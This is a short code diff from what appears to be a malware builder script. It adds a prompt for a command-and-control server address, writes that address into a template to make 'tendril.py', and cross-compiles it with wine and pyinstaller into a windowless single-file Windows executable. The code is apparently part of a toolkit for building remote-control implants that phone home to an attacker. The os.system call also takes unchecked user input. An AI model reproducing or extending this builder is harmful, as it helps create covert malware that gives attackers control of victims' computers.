@@ -49,7 +49,19 @@ else:
 		sys.exit()
 
 	if "-ct" in sys.argv or "--create-tendril" in sys.argv:
-		#candc = raw_input("# C&C-Server: ")
+		candc = raw_input("# C&C-Server: ")
+		# update tendril.py
+		f = open("tendrilTemplate.py", "r")
+		newFileContent = ""
+		for line in f.readlines():
+			if "[DUMMYCANDC]" in line:
+				line = "candc = \"" + candc + "\"\n"
+			newFileContent += line
+		f.close()
+		f = open("tendril.py", "w")
+		f.write(newFileContent)
+		f.close()
+		# cross compile...
 		virtualEnvWine = raw_input("# Virtual wine environment root-path: ")
 		pyinstaller = raw_input("# pyinstaller.py root-path: ")
 		os.system(". " + virtualEnvWine + "/bin/activate; wine c:/Python27/python.exe " + pyinstaller + " -w -a -F tendril.py")
